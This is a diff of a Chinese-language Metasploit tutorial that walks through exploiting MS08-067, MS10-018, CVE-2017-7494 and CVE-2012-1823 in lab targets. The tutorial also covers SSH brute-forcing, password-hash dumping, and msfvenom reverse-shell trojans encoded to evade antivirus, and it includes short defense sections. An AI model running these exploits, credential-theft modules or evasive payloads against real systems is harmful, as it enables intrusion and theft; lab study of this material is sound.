@@ -7,19 +7,21 @@ categories:
 tags:
   - MSF
   - 渗透测试
-description: MSF渗透测试框架的使用方法、常见漏洞复现（MS08-067、MS10-018、CVE-2017-7494）及msfvenom木马生成
+description: MSF渗透测试框架的使用方法、常见漏洞复现（MS08-067、MS10-018、CVE-2017-7494、CVE-2012-1823）及msfvenom木马生成
 ---
 
-# 一、MSF基础概述
-1. **定义**  
-Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
-2. **安装目录（Kali默认）**  
+# 一、MSF 是什么？
+## (一) 基础概述
+**定义**：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。
+
+**主要功能**：漏洞利用、生成攻击载荷、监听反弹连接、后渗透控制； 常用组件为`msfconsole`交互控制台、`msfvenom`后门生成工具。  
+
+**安装目录（Kali默认）**  
 `/usr/share/metasploit-framework/`
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img1.png)
+![](/img/posts/MSF的使用以及漏洞复现/img1.png)
 
-3. **核心目录分工**
-
+## (二) 核心目录分工
 | 目录 | 核心作用 |
 | --- | --- |
 | modules | MSF核心武器库，存放所有渗透模块 |
@@ -28,17 +30,131 @@ Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收
 | scripts | Meterpreter、自动化渗透脚本 |
 | tools | 独立编码、漏洞分析小工具 |
 
+## (三) modules六大子模块详解
 
-4. **modules六大子模块详解**
+![](/img/posts/MSF的使用以及漏洞复现/img2.png)
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img2.png)
+### 1. Auxiliary 辅助模块
++ 目录：modules/auxiliary/
++ 作用：不执行漏洞提权、不反弹shell；信息收集、扫描、爆破、嗅探、验证
++ 特点：无payload，单纯工具类，绝大多数不需要目标存在漏洞
++ 常见分类：
+    - 端口扫描：`auxiliary/scanner/portscan/tcp`
+    - 弱口令爆破：ssh、ftp、mysql、rdp爆破
+    - 漏洞探测（只检测不利用）：smb版本探测、CVE漏洞扫描
+    - DNS枚举、ARP嗅探、目录扫描、服务识别
++ 使用场景：前期**信息收集**阶段；探测目标是否存在漏洞，不获取权限。
 
-+ `auxiliary`：辅助模块，扫描、嗅探、弱口令爆破、漏洞探测
-+ `encoders`：编码器，Payload变形免杀，绕过杀毒/IDS
-+ `exploits`：漏洞利用EXP核心库，触发漏洞获取权限
-+ `nops`：空指令生成器，稳定溢出攻击内存执行
-+ `payloads`：攻击载荷，漏洞触发后执行反弹Shell、Meterpreter
-+ `post`：后渗透模块，提权、抓密码、持久化、内网横向移动
+示例 1：TCP 端口扫描
+
+```bash
+use auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS 192.168.1.0/24   # 目标IP/网段
+set PORTS 1-1000
+set THREADS 10               # 线程
+run
+```
+
+示例 2：SMB 版本探测（永恒之蓝前期探测）
+
+```bash
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.105
+run
+```
+
+示例 3：SSH 弱口令爆破
+
+```bash
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.1.100
+set USER_FILE /usr/share/wordlists/metasploit/default_users_for_smb.txt
+set PASS_FILE /usr/share/wordlists/metasploit/password.lst
+set THREADS 5
+run
+```
+
+### 2. Exploits 漏洞利用模块（EXP）
++ 目录：modules/exploits/
++ 作用：利用程序漏洞触发内存溢出、命令执行、文件上传等缺陷，开辟通道
++ 特点：必须搭配Payload使用！exp负责打通漏洞通道，payload负责执行代码
++ 原理：漏洞本身只能制造程序异常，不知道要执行什么操作；exp = 开锁，payload = 你要放进房间的指令（反弹shell、创建用户等）
++ 分类：
+    - Windows漏洞：MS08-067、MS17-010（永恒之蓝）
+    - Web漏洞：远程代码执行RCE
+    - 各类应用漏洞：Tomcat、Apache、路由器漏洞
+
+### 3. Payloads 攻击载荷（Shellcode）
++ 目录：modules/payloads/
++ 作用：漏洞利用成功后，在目标机器上最终执行的代码
++ Payload三大类型
+    1. **Single**  
+完整代码一体，不需要外部连接，一次性执行。  
+例：`windows/adduser` → 直接在目标新建管理员账号
+    2. **Stager**  
+体积短小，先运行小段代码，**主动回连攻击机**，再下载完整shellcode。  
+优点：体积小，容易绕过缓冲区长度限制  
+典型：`reverse_tcp` 反向连接
+    3. **Stage**  
+Stager连接成功后，后续下载运行的大代码，如Meterpreter
++ 高频Payload：
+    - `windows/meterpreter/reverse_tcp` Windows反向Meterpreter（最常用）
+    - `linux/x86/meterpreter/reverse_tcp` Linux反弹
+    - `cmd/unix/reverse_netcat` 简易nc反弹shell
+
+> Meterpreter属于高级payload，内存运行、无落地文件、功能极强
+>
+
+### 4. Encoders 编码器（免杀编码）
++ 目录：modules/encoders/  
+作用：对payload进行编码变形，规避杀毒软件、IDS、防火墙特征检测
++ 核心原理：原始shellcode存在固定特征，容易被AV查杀；编码器替换字符、改变二进制序列，运行时自动解码还原。
++ 经典编码器：`x86/shikata_ga_nai` 万花筒编码器
+
+```bash
+# msfvenom示例，编码5次
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > shell.exe
+```
+
+### 5. Nops 空指令模块（NOP生成器）
++ 目录：modules/nops/
+
+> NOP = No Operation，CPU空指令 `0x90`  
+**作用：生成一串无任何功能的空指令，填充缓冲区，用于缓冲区溢出漏洞开发**
+>
+
++ 原理：溢出利用时，很难精准命中shellcode起始地址；大量`0x90`滑行区，只要跳转进NOP区域，CPU一路空滑，最终执行payload。
++ 适用场景：**漏洞研究、自行编写EXP**
+
+### 6. Post 后渗透模块
++ 目录：modules/post/
++ 触发时机：已经拿到目标权限（Meterpreter会话）之后使用， 依赖 SESSION。
++ 作用：权限维持、信息窃取、内网横向移动、提权、痕迹清理
++ 常用分类：
+    1. 权限提升：`post/windows/escalate/getsystem`
+    2. 信息收集：获取密码、浏览器记录、系统账号、进程
+    3. 持久化后门：创建服务、注册表自启动
+    4. 内网渗透：ARP扫描、路由转发、抓取凭证
+    5. 清除日志、dump内存密码（mimikatz集成在内）
++ 使用方式：
+
+方式1：meterpreter会话内直接run
+
+```bash
+run post/windows/gather/hashdump
+```
+
+方式2：background会话后use调用
+
+```bash
+background			# 将会话放到后台，得到session编号
+sessions        # 查看所有会话
+
+use post/windows/gather/credentials/windows_autologin
+set SESSION 1		# 指定使用哪一条meterpreter会话
+run
+```
 
 # 二、MSF控制台基础命令
 | 命令 | 功能 |
@@ -58,28 +174,25 @@ Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收
 | `sessions -i ID` | 进入指定会话交互 |
 | `exit / quit` | 退出会话或MSF控制台 |
 
+### 1. msfconsole
 
-1. msfconsole
+![](/img/posts/MSF的使用以及漏洞复现/img3.png)
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img3.png)
+### 2. ？
 
-2. ？
+![](/img/posts/MSF的使用以及漏洞复现/img4.png)
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img4.png)
+### 3. search
 
-3. earch
+![](/img/posts/MSF的使用以及漏洞复现/img5.png)
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img5.png)
+### 4. use
 
-4. use
+![](/img/posts/MSF的使用以及漏洞复现/img6.png)
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img6.png)
+### 5. exit
 
-5. exit
-
-![](/img/posts/MSF的使用以及漏洞复现/doc_img7.png)
-
-退出 msf
+![](/img/posts/MSF的使用以及漏洞复现/img7.png)
 
 # 三、MSF 渗透测试
 ## (一) MS08-067
@@ -108,64 +221,62 @@ shell
 exit
 ```
 
-
-
 ### 3. 攻击步骤
 **环境**：WinXP SP3，445端口开放
 
 **前提条件**：已知目标机的 IP 地址 192.168.23.136
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img8.png)
+![](/img/posts/MSF的使用以及漏洞复现/img8.png)
 
 1. 启动 MSF 框架，准备攻击，执行 msfconsole 命令
 
-```plain
+```bash
 msfconsole -q
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img9.png)
+![](/img/posts/MSF的使用以及漏洞复现/img9.png)
 
 2. 加载漏洞模块，配置攻击参数
 
-```plain
-search MS08-067  
+```bash
+search MS08-067
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img10.png)
+![](/img/posts/MSF的使用以及漏洞复现/img10.png)
 
-```plain
+```bash
 use 0
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img11.png)
+![](/img/posts/MSF的使用以及漏洞复现/img11.png)
 
-```plain
+```bash
 show options
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img12.png)
+![](/img/posts/MSF的使用以及漏洞复现/img12.png)
 
 设置目标 IP 地址
 
-```plain
-set RHOSTS 192.168.23.136 
+```bash
+set RHOSTS 192.168.23.136
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img13.png)
+![](/img/posts/MSF的使用以及漏洞复现/img13.png)
 
-3. 执行攻击，获取系统权限。
+3. 执行攻击，获取系统权限
 
-```plain
+```bash
 run
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img14.png)
+![](/img/posts/MSF的使用以及漏洞复现/img14.png)
 
-```plain
+```bash
 shell
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img15.png)
+![](/img/posts/MSF的使用以及漏洞复现/img15.png)
 
 ### 4. 防御
 + 安装KB958644补丁
@@ -212,33 +323,33 @@ exit
 
 **前提条件**：已知目标机的 IP 地址 192.168.23.136
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img8.png)
+![](/img/posts/MSF的使用以及漏洞复现/img8.png)
 
-1. 启动 MSF ，准备攻击，执行 msfconsole 命令
+1. 启动 MSF，准备攻击，执行 msfconsole 命令
 
-```plain
+```bash
 msfconsole -q
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img16.png)
+![](/img/posts/MSF的使用以及漏洞复现/img16.png)
 
 2. 加载漏洞模块
 
-```plain
-search MS10-018  
+```bash
+search MS10-018
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img17.png)
+![](/img/posts/MSF的使用以及漏洞复现/img17.png)
 
-```plain
+```bash
 use 0
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img18.png)
+![](/img/posts/MSF的使用以及漏洞复现/img18.png)
 
 3. 设置 payload 正向连接 shell
 
-```plain
+```basic
 set PAYLOAD windows/meterpreter/bind_tcp
 ```
 
@@ -249,87 +360,85 @@ set PAYLOAD windows/meterpreter/bind_tcp
 | bind_tcp | 正向连接 shell | **靶机监听端口** | 攻击机主动连接靶机 |
 | reverse_tcp | 反向反弹 shell | **攻击机监听端口** | 靶机主动外联攻击机 |
 
-
 bind_tcp 正向 shell 缺点
 
 + 需要靶机防火墙**允许入站连接**（防火墙开启大概率直接失败）
 + 靶机会新增监听端口，容易被端口扫描发现异常
-4. 配置攻击参数，查看要设置哪些东西。
 
-```plain
+4. 配置攻击参数，查看要设置哪些东西
+
+```bash
 show options
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img19.png)
+![](/img/posts/MSF的使用以及漏洞复现/img19.png)
 
 查看攻击机的 IP 192.168.23.131
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img20.png)
+![](/img/posts/MSF的使用以及漏洞复现/img20.png)
 
 设置攻击机的 IP 地址
 
-```plain
-set SRVHOST 192.168.23.131 
+```bash
+set SRVHOST 192.168.23.131
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img21.png)
+![](/img/posts/MSF的使用以及漏洞复现/img21.png)
 
 修改 bind_tcp 载荷 LPORT，即自定义受害机监听端口
 
 作用：
 
 + 避免默认 4444 端口被占用导致监听失败
-+ 规避知名恶意端口特征，降低流量被安全设备检测发现的概率。  
++ 规避知名恶意端口特征，降低流量被安全设备检测发现的概率。
 
-```plain
+```bash
 set LPORT 9999
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img22.png)
+![](/img/posts/MSF的使用以及漏洞复现/img22.png)
 
 5. 启动攻击服务
 
-```plain
+```bash
 run
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img23.png)
+![](/img/posts/MSF的使用以及漏洞复现/img23.png)
 
-出现的 url 要通过社⼯等⽅法让⽬标机进⾏访问。
+出现的 url 要通过社工等方法让目标机进行访问。这里我们直接让目标机访问这个 url
 
-这里我们直接让目标机访问这个 url
+![](/img/posts/MSF的使用以及漏洞复现/img24.png)
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img24.png)
-
-![](/img/posts/MSF的使用以及漏洞复现/doc_img25.png)
+![](/img/posts/MSF的使用以及漏洞复现/img25.png)
 
 回车
 
 6. 查看后台任务与对话
 
-```plain
+```bash
 sessions
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img26.png)
+![](/img/posts/MSF的使用以及漏洞复现/img26.png)
 
 进入这个会话 1（i 就是 in，1 表示会话的 id）
 
-```plain
+```bash
 sessions -i 1
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img27.png)
+![](/img/posts/MSF的使用以及漏洞复现/img27.png)
 
 出现 `meterpreter >` 提示符，**代表漏洞利用成功、已和受害机建立控制通道**，可以对目标进行操作。
 
 7. 执行 shell 启动命令行
 
-```plain
+```bash
 shell
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img28.png)
+![](/img/posts/MSF的使用以及漏洞复现/img28.png)
 
 ### 4. 防御
 + 安装KB980182补丁
@@ -364,6 +473,7 @@ run
     - 服务器共享目录具有访问权限。
     - 要对服务器上写一个文件，并知道其绝对路径。
     - 系统开启了文件/打印机共享端口445。
+
 1. 启动靶机
 
 ```bash
@@ -371,7 +481,7 @@ run
 su root
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img29.png)
+![](/img/posts/MSF的使用以及漏洞复现/img29.png)
 
 提示符变为 `root@ubuntu#` 代表切换成功
 
@@ -385,7 +495,7 @@ cd /home/enjoy/vulhub-master/samba/CVE-2017-7494
 docker-compose up -d
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img30.png)
+![](/img/posts/MSF的使用以及漏洞复现/img30.png)
 
 注：实验结束，关闭销毁靶场
 
@@ -402,7 +512,7 @@ docker-compose down
 ifconfig
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img31.png)
+![](/img/posts/MSF的使用以及漏洞复现/img31.png)
 
 3. 启动 MSF
 
@@ -410,53 +520,53 @@ ifconfig
 msfconsole -q
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img32.png)
+![](/img/posts/MSF的使用以及漏洞复现/img32.png)
 
-2. 搜索漏洞模块
+4. 搜索漏洞模块
 
 ```bash
 search CVE-2017-7494
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img33.png)
+![](/img/posts/MSF的使用以及漏洞复现/img33.png)
 
-3. 加载SambaCry漏洞的攻击模块
+5. 加载SambaCry漏洞的攻击模块
 
 ```bash
 use 0
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img34.png)
+![](/img/posts/MSF的使用以及漏洞复现/img34.png)
 
-4. 查看当前模块需要配置的参数
+6. 查看当前模块需要配置的参数
 
 ```bash
 show options
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img35.png)
+![](/img/posts/MSF的使用以及漏洞复现/img35.png)
 
-5. 设置远程受害主机IP
+7. 设置远程受害主机IP
 
 ```bash
 set RHOSTS 192.168.23.135
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img36.png)
+![](/img/posts/MSF的使用以及漏洞复现/img36.png)
 
-6. 执行攻击
+8. 执行攻击
 
 ```bash
 run
 ```
 
-7. 启动命令行
+9. 启动命令行
 
 ```bash
 id
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img37.png)
+![](/img/posts/MSF的使用以及漏洞复现/img37.png)
 
 ### 4. 防御
 + 升级Samba版本
@@ -464,19 +574,145 @@ id
 + 共享目录设只读
 + 防火墙限制445端口。
 
-## (四) msfvenom 生成后门木马
-### Msfvenom 是什么？
+## (四) CVE-2012-1823（PHP CGI漏洞利用）
+### 1. 简介
+CVE-2012-1823 是 PHP-CGI 模式 下的高危远程代码执行漏洞，影响 PHP < 5.3.12 和 PHP < 5.4.2 版本。当 PHP 以 CGI 模式运行时，QUERY_STRING 中的参数会被直接当作 php-cgi 命令行参数 解析，从而允许攻击者传入 -s、-d、-c 等开关，实现**源码泄露**或**任意代码**执行。  
+漏洞成因 根据 RFC3875 规范，当 QUERY_STRING 中不包含 = 时，Web 服务器会将其作为命令行参数传递给 CGI 程序。PHP 在 CGI SAPI 中未正确过滤这些参数，导致攻击者可构造恶意 URL 直接传递命令行选项。
+
+### 2. 命令行汇总
+```bash
+# 1. 启动MSF控制台
+msfconsole
+
+# 2. 搜索漏洞模块 
+search CVE-2012-1823
+
+# 加载PHP-CGI参数注入EXP模块
+use exploit/multi/http/php_cgi_arg_injection
+
+# 设置目标IP（Ubuntu靶机地址）
+set RHOSTS xxxx
+
+# 设置目标端口
+set RPORT 8080
+
+# 执行漏洞攻击
+run
+
+# 成功获取会话后，调取目标系统原生命令行
+shell
+
+# 查看当前系统权限
+id
+```
+
+### 3. 攻击步骤
++ **环境搭建：** 靶机vulhub
+1. 启动靶场
+
+```bash
+# 停止旧容器
+docker-compose down
+
+# 切换root管理员权限
+su root
+
+# 切换至漏洞目录
+cd /home/enjoy/vulhub-master/php/CVE-2012-1823
+
+# 构建镜像（首次启动环境执行）
+docker-compose build
+
+# 后台启动靶场容器
+docker-compose up -d
+
+# 校验docker-compose配置是否正常（可选命令）
+docker-compose config
+```
+
+![](/img/posts/MSF的使用以及漏洞复现/img48.png)
+
+2. 启动 MSF
+
+```bash
+msfconsole -q
+```
+
+![](/img/posts/MSF的使用以及漏洞复现/img32.png)
+
+3. 搜索漏洞模块
+
+```bash
+search CVE-2012-1823
+```
+
+![](/img/posts/MSF的使用以及漏洞复现/img49.png)
+
+4. 加载漏洞攻击模块
+
+```bash
+use 0
+```
+
+![](/img/posts/MSF的使用以及漏洞复现/img50.png)
+
+5. 查看当前模块需要配置的参数
+
+```bash
+show options
+```
+
+![](/img/posts/MSF的使用以及漏洞复现/img51.png)
+
+6. 设置远程受害主机IP 和 端口
+
+![](/img/posts/MSF的使用以及漏洞复现/img52.png)
+
+```bash
+set RHOSTS 192.168.23.135
+set RPORT 8080
+```
+
+![](/img/posts/MSF的使用以及漏洞复现/img53.png)
+
+7. 执行攻击
+
+```bash
+run
+```
+
+![](/img/posts/MSF的使用以及漏洞复现/img54.png)
+
+8. 启动命令行
+
+```bash
+shell
+id		#查看当前执行权限
+ip addr
+```
+
+![](/img/posts/MSF的使用以及漏洞复现/img55.png)
+
+### 4. 防御
++ 升级 PHP 到 5.3.12、5.4.2 及以上安全版本；
++ 废弃 PHP-CGI 模式，改用 PHP-FPM；
++ 在 Apache/Nginx 配置规则，拦截-d、-s等危险 URL 参数；
++ 使用低权限账号运行 PHP 程序；
++ 监控日志与进程行为，及时发现漏洞攻击尝试。
+
+## (五) msfvenom 生成后门木马
+### 1. Msfvenom 是什么？
 Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。
 
 ### 2. 使用场景
 Msfvenom常用于**红队渗透测试**和**社会工程学攻击**中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动
 
 ### 3. 核心参数
-1. -p 指定使用的攻击 payload（后门类型），例如`windows/meterpreter/reverse_tcp`
-2. LHOSTLocal Host，攻击机（Kali）IP，受害机主动反弹连接这个地址
-3. LPORT 攻击机开启监听的端口
-4. -f 文件输出格式（elf、exe、so、raw 等）
-5. -o 保存生成的后门文件（output）
+1. `-p` 指定使用的攻击 payload（后门类型），例如 `windows/meterpreter/reverse_tcp`
+2. `LHOST` Local Host，攻击机（Kali）IP，受害机主动反弹连接这个地址
+3. `LPORT` 攻击机开启监听的端口
+4. `-f` 文件输出格式（elf、exe、so、raw 等）
+5. `-o` 保存生成的后门文件（output）
 
 ### 4. 基础语法
 ```bash
@@ -486,7 +722,7 @@ msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文�
 ### 5. Windows木马示例
 1. 查看攻击机的 IP 192.168.23.131
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img38.png)
+![](/img/posts/MSF的使用以及漏洞复现/img38.png)
 
 2. msfvenom 生成Windows反弹木马
 
@@ -500,9 +736,9 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.23.131 lport=9999 -f e
 + `-f exe`：输出格式为Windows可执行程序
 + `> hello.exe`：将内容输出保存为hello.exe（等价 `-o hello.exe`）
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img39.png)
+![](/img/posts/MSF的使用以及漏洞复现/img39.png)
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img40.png)
+![](/img/posts/MSF的使用以及漏洞复现/img40.png)
 
 3. 监听
 
@@ -522,11 +758,11 @@ exploit -j
 + `set LPORT 9999`：监听端口，必须和木马端口保持统一
 + `exploit -j`：`-j` = job后台运行监听，不会占用当前窗口
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img41.png)
+![](/img/posts/MSF的使用以及漏洞复现/img41.png)
 
 4. 把木马放到靶机并运行hello.exe，成功得到meterpreter > 后执行
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img42.png)
+![](/img/posts/MSF的使用以及漏洞复现/img42.png)
 
 5. 查看后台任务与对话
 
@@ -534,32 +770,32 @@ exploit -j
 sessions
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img43.png)
+![](/img/posts/MSF的使用以及漏洞复现/img43.png)
 
 ```bash
 sessions -i 1
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img44.png)
+![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756492637-9e1b9422-44c1-4f64-8161-eb91f065d4e5.png)
 
 6. 实现远程控制
 
-```plain
+```bash
 screenshot      # 对受害主机屏幕截图
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img45.png)
+![](/img/posts/MSF的使用以及漏洞复现/img45.png)
 
-```plain
+```bash
 shell           # 调出目标原生cmd命令行
 ipconfig
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img46.png)
+![](/img/posts/MSF的使用以及漏洞复现/img46.png)
 
-```plain
+```bash
 run vnc         # 开启VNC远程桌面控制
 ```
 
-![](/img/posts/MSF的使用以及漏洞复现/doc_img47.png)
+![](/img/posts/MSF的使用以及漏洞复现/img47.png)
 
